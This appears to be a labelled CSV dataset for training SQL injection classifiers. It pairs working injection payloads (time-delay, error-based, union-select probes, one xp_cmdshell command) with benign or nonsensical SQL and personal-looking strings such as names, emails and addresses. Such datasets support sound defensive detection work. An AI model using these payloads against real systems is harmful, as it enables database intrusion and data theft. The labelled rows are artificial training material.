Query,Label
1'  )   waitfor delay '0:0:5',1
SELECT statement ( s )  FROM nine FULL OUTER JOIN,0
"-4541""   )    )    or make_set  (  4821  =  5233,5233  )   and    (    (   ""xfex""  =  ""xfex",1
SELECT plate FROM ability UNION ALL SELECT canal FROM sum ORDER BY slip,0
"  SELECT * FROM problem WHERE factory IN  ( 'close', 'hard', 'halfway' )  ",0
SELECT * FROM chest,0
2946,0
SELECT CURRENT_DATE (  )  + 1;,0
"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",1
SELECT * FROM Orders WHERE OrderDate BETWEEN '1996-07-01' AND '1996-07-31';,0
"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",1
"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,1
"1""  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
eglevsky-dux@tacticlinks.ch,0
albatana,0
"1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '",1
SELECT * FROM bridge WHERE friend = 'captured'  AND City = 'country',0
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",1
SELECT * FROM  ( SELECT shake FROM tea ) ,0
SELECT * FROM either FETCH FIRST 50 PERCENT ROWS ONLY,0
"1'   )    )     )   union all select null,null,null,null,null,null,null--",1
SELECT AVG ( practical ) FROM brother SELECT SUM ( yes ) ,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'zdkn'  =  'zdkn",1
91394289v,0
1  )   as imdt where 6431  =  6431,1
"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",1
SELECT COUNT ( rope ) FROM total,0
mota del cuervo,0
SELECT * FROM grabbed WHERE mass = 'pictured' FETCH FIRST 3 ROWS ONLY,0
select   (  case when   (  9562  =  5996  )   then 1 else 9562*  (  select 9562 from master..sysdatabases  )   end  )  --,1
SELECT AVG ( join ) FROM silent SELECT SUM ( garage ) ,0
1'+  (  select gblp where 6768  =  6768,1
consalve,0
"-8793' where 3853  =  3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",1
//*,1
rousseau,0
"   SELECT COUNT ( conversation ) , under FROM anything BY seen",0
yunquera de henares,0
17850,0
SELECT * FROM wp_posts WHERE ID  =  292420 LIMIT 1,0
rasmia,0
"1  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  3039  =  3039",1
francina,0
"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",1
"1%""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""%""  =  """,1
"1',  (  select   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  select 6894 from information_schema.character_sets  )   end   )    )   ",1
2446e8t6da,0
SELECT * FROM receive WHERE Price NOT BETWEEN 10 AND 20,0
07194416q,0
"-5198   )    )     )   union all select 7089,7089,7089,7089,7089,7089,7089,7089#",1
SELECT * FROM cream WHERE break = 'around',0
1'+  (  select emeu where 2310  =  2310,1
2.57E+15,0
SELECT * FROM had WHERE keep = 'claws',0
SELECT thus ( s )  FROM earth LEFT JOIN,0
SELECT * FROM bite WHERE dish NOT LIKE '[policeman]%',0
SELECT AVG ( Price ) FROM angry,0
SELECT * FROM sweet WHERE living = 'yourself' LIMIT 3,0
"isabelita ruiz, 31",0
1'  )   as wjty where 2971  =  2971,1
"1""  )   where 2633  =  2633 union all select null,null,null,null#",1
SELECT TOP 3 * FROM human WHERE could = 'pretty',0
SELECT COUNT ( whenever ) FROM sell,0
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv",1
espls,0
select   (  case when   (  2914  =  3335  )   then 2914 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
donadieu zanotti,0
SELECT * FROM them WHERE silly NOT BETWEEN 'dozen' AND 'bottom',0
46700,0
mejury8,0
"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xnsj"" like ""xnsj",1
retiendas,0
SELECT single FROM invented UNION SELECT pick FROM heading ORDER BY hospital,0
"1'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM cool  WHERE raise NOT LIKE '[reason]%',0
SELECT * FROM news WHERE gently NOT LIKE '[paper]%',0
"   SELECT truck,straw,political,worse,involved     (  (  stuck JOIN fed ON practical.relationship =  air.section )   INNER JOIN mirrorON Orders.city =  movement.bentID ) ",0
SELECT DISTINCT cannot FROM feature,0
SELECT DEGREES ( PI (  ) *2 ) ;,0
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
pasivamente,0
SELECT * FROM substance FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT AVG ( outside ) FROM combine,0
"-8841%""  )   or 4361  =  1910",1
"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",1
4.64693E+15,0
"1"" where 4450  =  4450 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
-7940'  )   union all select 6024--,1
"   SELECT enjoy, necessary, sentence FROM grain WHERE wrong  IS NULL",0
"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",1
SELECT * FROM sat WHERE NOT beat = 'soon'  AND NOT wire = 'island',0
1'  )   as upgb where 2031  =  2031,1
1 where 6500  =  6500,1
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
"  SELECT * FROM sent WHERE result NOT IN  ( 'scale', 'buried', 'basket' )  ",0
SELECT * FROM nearer WHERE NOT useful = 'sold'  AND NOT example = 'circle',0
SELECT * FROM calm WHERE past IN  ( SELECT system FROM develop ) ,0
1'||  (  select 'awba' from dual where 3749  =  3749 and 1445  =  3334--,1
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'gkku' like 'gkku",1
castellanos de zapardiel,0
" SELECT * FROM label ORDER BY natural ASC, wherever DESC",0
SELECT TOP 50 PERCENT * FROM went SELECT * FROM that FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ear,0
vall de ebo,0
"-8654' union all select 7190,7190,7190,7190,7190#",1
50296,0
SELECT AVG ( Price )  AS   AveragePrice FROM Products;,0
SELECT AVG ( Price ) FROM movie,0
"   SELECT Employees.remarkable, COUNT ( Orders.somehowID )  AS biggerFROM    ( OrdersINNER JOIN realize ON Orders.southID  =  Employees.baseballID ) ",0
" SELECT column_name ( s )  FROM father,wide",0
nogueras,0
"  SELECT * FROM drove WHERE imagine NOT IN  ( 'national', 'private', 'company' )  ",0
SELECT * FROM peace,0
SELECT * FROM getting 3,0
SELECT themselves FROM riding UNION ALL SELECT might FROM rose ORDER BY dangerous,0
" SELECT column_name ( s )  FROM suggest,had",0
SELECT roll ( s )  FROM slide LEFT JOIN,0
"1' where 8950  =  8950 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1  )   where 5309  =  5309 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
339403r90am958e,0
8.45E+15,0
"1%""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""%""  =  """,1
-6529'  )   or   (  4309  =  1601  )  *1601,1
SELECT * FROM selection WHERE type BETWEEN '1996-07-01' AND '1996-07-31',0
"plza. mirto, 135",0
8912,0
"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  # miji",1
1  )   as lisg where 5490  =  5490,1
60210107v,0
1'||  (  select 'ucxp' where 6612  =  6612 order by 1--,1
SELECT * FROM play ORDER BY taught DESC,0
"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",1
moretti alegre,0
"1,  (  select * from generate_series  (  9108,9108,case when   (  9108  =  2900  )   then 1 else 0 end  )   limit 1  )  ",1
"-6618""   )    )     )   order by 1#",1
 union all select @@version--,1
levert,0
3.81793E+14,0
SELECT * FROM solid,0
SELECT Count ( * )  AS route,0
"c/ pozo seco 37, 6-d",0
"-9434""  )   as cqlw where 1600  =  1600 or 2733  =  1047--",1
SELECT importance ( s ) FROM earth INNER JOIN,0
dominguez@comercioenlacalle.hn,0
SELECT * FROM rope WHERE making = 'spring' LIMIT 3,0
roger,0
SELECT * FROM story WHERE table BETWEEN '1996-07-01' AND '1996-07-31',0
"  SELECT create,bottom FROM pretty WHERE familiar = 'play' UNION SELECT tower, opinion FROM go",0
SELECT * FROM bit WHERE sport NOT BETWEEN 'frog' AND 'cattle',0
SELECT COUNT ( DISTINCT weight )  FROM quickly,0
SELECT improve ( s )  FROM cave,0
"1%'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  '%'  =  '",1
alicanto,0
"SELECT ProductName, UnitPrice *  ( UnitsInStock + COALESCE ( UnitsOnOrder, 0  )  )   FROM Products;",0
28413,0
"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",1
SELECT AVG ( visitor ) FROM dinner,0
DELETE FROM ring,0
-5137  )   or 9323  =  9323#,1
"INSERT INTO doll ( every, dull, strange, seven, charge, political )  VALUES  ( 'addition', 'express'. wall', 'corner', 'taken', 'darkness', 'activity' )  ",0
acachorrar,0
16340,0
" SELECT * FROM double ORDER BY steam ASC, breeze DESC",0
osada,0
"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",1
"1""  )   where 9020  =  9020 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1
"1""  )   as jngl where 8384  =  8384 and 4580  =  1718--",1
SELECT * FROM nearby WHERE    NOT toward = 'letter',0
amorebieta-etxano,0
SELECT * FROM noun WHERE NOT rod = 'younger'  AND NOT for = 'balance',0
villamuera de la cueza,0
nalec,0
alvino,0
1   )    )    as eveb where 7567  =  7567,1
ushiahua,0
"-2860""   )    )    order by 1#",1
"  SELECT substanceID AS ID, instant AS triangle FROM bush",0
"1""  )   where 7513  =  7513 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
c/ javea 57,0
SELECT * FROM consonant WHERE using LIKE '%book%',0
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1
" SELECT * FROM electric ORDER BY mainly, sort",0
quilolitr-o,0
"select pg_sleep  (  5  )   and    (    (   ""%""  =  """,1
"1%'   )    )    union all select null,null--",1
"calle barrio carmelo 21,",0
""" or sleep  (  __TIME__  )  #",1
1 where 4785  =  4785 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
"-9007  )   as gill where 6462  =  6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",1
"1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  5220  =  5220",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",1
"1'+  (  select 'qpxk' where 7139  =  7139 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",1
barcones,0
SELECT AVG ( Price ) FROM effort,0
"1"" rlike   (  select   (  case when   (  3711  =  3313  )   then 1 else 0x28 end   )    )    and ""iqlh"" like ""iqlh",1
1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#,1
mcavoy-zabczynski@discotecateatre.gt,0
"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",1
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # myqr",1
"1' where 2123  =  2123 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
crabe,0
SELECT * FROM keep  WHERE attached = gate,0
"   SELECT limited, cage, simplyFROM choice WHERE supply  IS NOT NULL",0
"-1351"" where 6968  =  6968 or 5684  =  8582",1
"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",1
SELECT * FROM instant WHERE noise = 'numeral' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM magnet WHERE four LIKE '%fat%',0
"INSERT INTO skill  ( lunch, entire, basket )  VALUES  ( 'scientist', 'government', 'worried' )  ",0
"""  )  ;waitfor delay '0:0:__TIME__'--",1
SELECT AVG ( journey ) FROM orange SELECT SUM ( farm ) ,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_twitter_url' LIMIT 1,0
SELECT * FROM chest 3 SELECT * FROM definition,0
"  SELECT roof,glass,tomorrow FROM he LEFT JOIN Orders ON plates.familiarID =  life.ate ORDER BY enter.composed",0
1 where 2301  =  2301,1
"1%'   )    )    union all select null,null,null,null,null,null,null--",1
"1  )   where 5012  =  5012   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
SELECT Count ( * )  AS basket,0
"1"" waitfor delay '0:0:5'--",1
"1%""   )    )     )   order by 1--",1
" SELECT * FROM turn ORDER BY offer, hat",0
alexiana,0
stanger-kitabayashi7@gestionsoftware.th,0
glickman,0
SELECT * FROM surrounded ORDER BY ear,0
"1'  )   as vmmk where 5757  =  5757 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1%"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1
cunanan,0
SELECT * FROM some FETCH FIRST 3 ROWS ONLY,0
"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",1
ajmet,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""cuzi"" like ""cuzi",1
SELECT * FROM anybody WHERE struck NOT BETWEEN 'pull' AND 'rabbit',0
"  SELECT direction,engine FROM kitchen WHERE want = 'yes' UNION SELECT shut, even FROM behavior",0
SELECT * FROM verb  WHERE forgot NOT LIKE '[arrow]%',0
SELECT MIN ( body )  AS mixture FROM cheese,0
trebaol@arroyomolinos-madrid.gq,0
SELECT * FROM planned WHERE NOT ourselves = 'nervous'  AND NOT open = 'particular',0
SELECT COUNT ( grown ) FROM moment,0
"calle jose espejo, 130, 12?a",0
SELECT interest FROM men,0
"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",1
moll@eurograb.ic,0
SELECT TOP 3 * FROM worse,0
SELECT * FROM product  WHERE orange = sudden,0
cabot camaran,0
64526656h,0
takakura@cenitsoria.sb,0
SELECT * FROM deep WHERE NOT sky = 'tent'  AND NOT who = 'crew',0
"1  )   where 9059  =  9059 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
3471,0
SELECT * FROM seeing WHERE there BETWEEN '1996-07-01' AND '1996-07-31',0
"calle prat de la riba, 73",0
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cssb'  =  'cssb",1
9.42955E+15,0
"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""tkkg""  =  ""tkkg",1
522lta,0
3.55661E+15,0
SELECT TOP 3 * FROM forty SELECT * FROM movie 3SELECT * FROM like,0
kouraviev@socimi.com.gl,0
"1   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5137  =  5137",1
"1'+  (  select 'sppw' where 1677  =  1677 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1
"-3215""  )   union all select 4457,4457,4457,4457,4457#",1
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""jbty"" like ""jbty",1
SELECT TOP 3 * FROM pig WHERE slow = 'cry',0
"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",1
SELECT protection FROM riding,0
"1""  )   as ymto where 3453  =  3453",1
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
rupp@djbroadcast.gov,0
"  UPDATE through SET count =  'piano', City =  'plane' WHERE chief =  simple",0
